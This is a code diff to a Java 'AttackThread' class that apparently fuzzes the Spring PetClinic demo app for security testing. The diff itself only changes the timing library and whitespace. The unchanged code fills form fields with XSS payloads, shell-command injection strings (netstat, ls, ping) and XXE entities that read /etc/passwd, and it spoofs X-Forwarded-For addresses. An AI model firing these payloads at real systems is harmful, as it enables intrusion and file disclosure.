@@ -4,7 +4,6 @@ import java.security.SecureRandom;
 import java.util.ArrayList;
 import java.util.List;
 
-import org.apache.commons.lang.time.StopWatch;
 import org.apache.http.Consts;
 import org.apache.http.HttpEntity;
 import org.apache.http.NameValuePair;
@@ -20,13 +19,14 @@ import org.apache.http.impl.client.CloseableHttpClient;
 import org.apache.http.impl.client.HttpClients;
 import org.apache.http.message.BasicNameValuePair;
 import org.apache.http.util.EntityUtils;
+import org.springframework.util.StopWatch;
 
 public class AttackThread extends Thread {
 
     private CloseableHttpClient httpclient;
     private CookieStore cookieStore;
     private StopWatch watch;
-    
+
     /* Scan settings */
     private String baseUrl;
     private String address;
@@ -34,13 +34,13 @@ public class AttackThread extends Thread {
     private int scanDuration;
     private long requestDelay;
 	private boolean verbose;
-	
+
 	/* Statistics */
 	private int requestCount;
 	private long totalScanTime;
 	private double highest;
 	private double lowest;
-	
+
     public AttackThread() {
     	int port = 8080;
     	address = getRandomAddress();
@@ -48,12 +48,12 @@ public class AttackThread extends Thread {
         this.requestDelay = 1000;
         this.scanDuration = 1000;
         this.verbose = true;
-        
+
         this.highest = -1;
         this.lowest = -1;
-        
+
         this.watch = new StopWatch();
-        		
+
         try {
             cookieStore = new BasicCookieStore();
             RequestConfig globalConfig = RequestConfig.custom()
@@ -63,20 +63,20 @@ public class AttackThread extends Thread {
                     .setDefaultCookieStore(cookieStore)
                     .setDefaultRequestConfig(globalConfig)
                     .build();
-            
+
             sendGet( "/", false );
-            
-            
+
+
         } catch (Exception e ) {
             e.printStackTrace();
         }
     }
-    
+
     public static void main( String[] args ) {
     	AttackThread at = new AttackThread();
     	at.start();
     }
-    
+
     public void run() {
         long start = System.currentTimeMillis();
         while( System.currentTimeMillis() - start < scanDuration * 1000 ) {
@@ -88,26 +88,26 @@ public class AttackThread extends Thread {
 
                 // get random page
                 String page = PAGES[RANDOM.nextInt( PAGES.length )];
-                
+
                 // extract any forms
                 String form = sendGet( page, false );
-                
+
                 // bombard the form
                 scan( page, form, 50 );
-                
+
             } catch( Exception e ) {
                 e.printStackTrace();
             }
         }
     }
-    
+
     private void scan(String lesson, String form, int attackPercent ) throws Exception {
         List<NameValuePair> fields = parseForm( form );
         boolean attack = RANDOM.nextBoolean();
         permute( fields, attack, attackPercent );
         sendPost( lesson, fields );
     }
-    
+
     private void permute(List<NameValuePair> fields, boolean attack, int attackPercent ) {
         for ( int i=0; i<fields.size(); i++ ) {
             NameValuePair field = fields.get( i );
@@ -122,7 +122,7 @@ public class AttackThread extends Thread {
        }
     }
 
-    
+
     public String sendGet(String url, boolean xhr ) throws Exception {
         HttpGet httpGet = new HttpGet(baseUrl + url);
 //        System.out.println( "SENDING: " + httpGet.getURI() );
@@ -130,13 +130,12 @@ public class AttackThread extends Thread {
         if ( xhr ) {
             httpGet.addHeader("X-Requested-With","XMLHttpRequest");
         }
-        watch.reset();
-        watch.start();
+        watch.start("send-get");
         CloseableHttpResponse response = httpclient.execute(httpGet);
         HttpEntity entity = response.getEntity();
         String content = EntityUtils.toString(entity);
         watch.stop();
-        long elapsed = watch.getTime();
+        long elapsed = watch.getLastTaskTimeMillis();
         checkHighestLowest(elapsed);
 		this.totalScanTime += elapsed;
         this.requestCount++;
@@ -144,8 +143,8 @@ public class AttackThread extends Thread {
         return content;
     }
 
-    
-    
+
+
     public String sendPost(String url, List<NameValuePair> fields ) throws Exception {
         UrlEncodedFormEntity entity = new UrlEncodedFormEntity(fields, Consts.UTF_8);
         HttpPost httpPost = new HttpPost(baseUrl + url);
@@ -155,13 +154,12 @@ public class AttackThread extends Thread {
         }
         httpPost.addHeader("X-Forwarded-For", address );
         httpPost.setEntity(entity);
-        
-        watch.reset();
-        watch.start();
+
+        watch.start("send-post");
         CloseableHttpResponse response = httpclient.execute(httpPost);
         String content = EntityUtils.toString(response.getEntity());
         watch.stop();
-        long elapsed = watch.getTime();
+        long elapsed = watch.getLastTaskTimeMillis();
         checkHighestLowest(elapsed);
 		totalScanTime += elapsed;
         response.close();
@@ -172,7 +170,7 @@ public class AttackThread extends Thread {
         requestCount++;
         return content;
     }
-    
+
     private void checkHighestLowest(long elapsed) {
 		if(highest == -1 || elapsed > highest) {
 			highest = elapsed;
@@ -181,19 +179,19 @@ public class AttackThread extends Thread {
 			lowest = elapsed;
 		}
 	}
-    
+
     public long getTotalScanTime() {
 		return totalScanTime;
 	}
-    
+
     public int getRequestCount() {
 		return requestCount;
 	}
-    
+
     private static String getAttack() {
         return FRAGS[ RANDOM.nextInt(FRAGS.length) ];
     }
-    
+
 	private static String getRandomAddress() {
         StringBuilder sb=new StringBuilder();
         sb.append( RANDOM.nextInt(256) );
@@ -206,7 +204,7 @@ public class AttackThread extends Thread {
         return sb.toString();
     }
 
-    
+
 	private static List<NameValuePair> parseForm( String content ) {
         List<NameValuePair> fields = new ArrayList<NameValuePair>();
         int formStart = content.indexOf( "<form" );
@@ -246,7 +244,7 @@ public class AttackThread extends Thread {
             }
             name = tag.substring(nameStart+6, nameStop);
         }
-        
+
         String value = "default";
         int valueStart = tag.indexOf("value=" );
         if ( valueStart != -1 ) {
@@ -265,14 +263,14 @@ public class AttackThread extends Thread {
     private static String getToken() {
         StringBuilder sb = new StringBuilder();
         for ( int i = 0; i < 5; i++ ) {
-            sb.append( (char)(RANDOM.nextInt(26) +'a' ) ); 
+            sb.append( (char)(RANDOM.nextInt(26) +'a' ) );
         }
         for ( int i = 0; i< 3; i++ ) {
             sb.append( (char)(RANDOM.nextInt(10) + '0' ) );
         }
         return sb.toString();
     }
-    
+
     private static SecureRandom RANDOM = new SecureRandom();
     private static String[] FRAGS = {
         "' onmouseover='alert(" + getToken() + ")",
@@ -286,14 +284,14 @@ public class AttackThread extends Thread {
         "; netstat -arn",
         "'> ls -lisa",
         "\"' & ping 192.168.0.1",
-        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///dev/random\">]><foo>&xxe;</foo>",        
+        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///dev/random\">]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
     };
-    
+
     private static String[] PAGES = {
 		"/owners/1",
 		"/owners/1/pets/new",
-		"/owners/1/edit",    		
+		"/owners/1/edit",
 		"/owners/1/pets/1/edit",
 		"/owners/1/pets/1/visits/new",
 		"/oups",
@@ -302,7 +300,7 @@ public class AttackThread extends Thread {
 //		"/vets.json",
 		"/owners",
 		"/owners/find",
-		"/owners/new",		
+		"/owners/new",
 		"/favicon.ico",
 //		"/manage/metrics",
 //		"/manage/metrics.json",
@@ -331,5 +329,5 @@ public class AttackThread extends Thread {
 //		"/manage/env",
 //		"/manage/env.json"
 		};
-    
+
 }
